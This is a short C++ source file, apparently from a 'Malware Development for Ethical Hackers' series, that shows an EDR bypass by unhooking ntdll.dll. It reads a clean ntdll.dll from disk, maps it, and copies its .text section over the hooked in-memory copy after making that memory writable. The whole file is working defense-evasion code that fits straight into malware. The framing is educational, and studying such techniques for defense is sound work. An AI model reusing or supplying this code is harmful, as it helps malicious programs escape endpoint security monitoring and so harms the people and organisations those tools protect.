/*
 * Malware Development for Ethical Hackers
 * hack.c
 * example of EDR bypass - remapping ntdll
 * author: @cocomelonc
*/
#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <psapi.h>

int main() {
  HANDLE hProcess = GetCurrentProcess();
  MODULEINFO moduleInfo = {};
  HMODULE hNtdllModule = GetModuleHandleA("ntdll.dll");
  LPVOID lpStartingPageAddress = NULL;
  SIZE_T dwSizeOfTheRegion = NULL;

  // retrieve information about the loaded ntdll.dll module
  GetModuleInformation(hProcess, hNtdllModule, &moduleInfo, sizeof(moduleInfo));

  // get the base address of the ntdll.dll module
  LPVOID lpNtdllBase = (LPVOID)moduleInfo.lpBaseOfDll;

  // open the ntdll.dll file
  HANDLE hNtdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

  // create a file mapping for the ntdll.dll file
  HANDLE hNtdllMapping = CreateFileMapping(hNtdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);

  // map the file mapping into the process's virtual address space
  LPVOID lpNtdllMappingAddress = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, 0, 0, 0);

  // get the DOS header of the hooked ntdll.dll
  PIMAGE_DOS_HEADER pDosHeaderOfHookedDll = (PIMAGE_DOS_HEADER)lpNtdllBase;

  // get the NT header of the hooked ntdll.dll
  PIMAGE_NT_HEADERS pNtHeaderOfHookedDll = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpNtdllBase + pDosHeaderOfHookedDll->e_lfanew);

  // loop through each section of the PE header
  for (WORD i = 0; i < pNtHeaderOfHookedDll->FileHeader.NumberOfSections; i++) {
    PIMAGE_SECTION_HEADER pHookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtHeaderOfHookedDll) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

    // check if the section is the .text section
    if (!strcmp((char*)pHookedSectionHeader->Name, (char*)".text")) {
      DWORD dwOldProtection = 0;
      lpStartingPageAddress = (LPVOID)((DWORD_PTR)lpNtdllBase + (DWORD_PTR)pHookedSectionHeader->VirtualAddress);
      dwSizeOfTheRegion = pHookedSectionHeader->Misc.VirtualSize;

      // change the protection of the memory region to allow writing
      bool bIsProtected = VirtualProtect(lpStartingPageAddress, dwSizeOfTheRegion, PAGE_EXECUTE_READWRITE, &dwOldProtection);

      // copy the contents of the .text section from the clean ntdll.dll to the infected version
      memcpy(lpStartingPageAddress, (LPVOID)((DWORD_PTR)lpNtdllMappingAddress + (DWORD_PTR)pHookedSectionHeader->VirtualAddress), pHookedSectionHeader->Misc.VirtualSize);

      // restore the original protection of the memory region
      bIsProtected = VirtualProtect(lpStartingPageAddress, dwSizeOfTheRegion, dwOldProtection, &dwOldProtection);
    }
  }

  // cleanup
  CloseHandle(hProcess);
  CloseHandle(hNtdllFile);
  CloseHandle(hNtdllMapping);
  FreeLibrary(hNtdllModule);

  return 0;
}
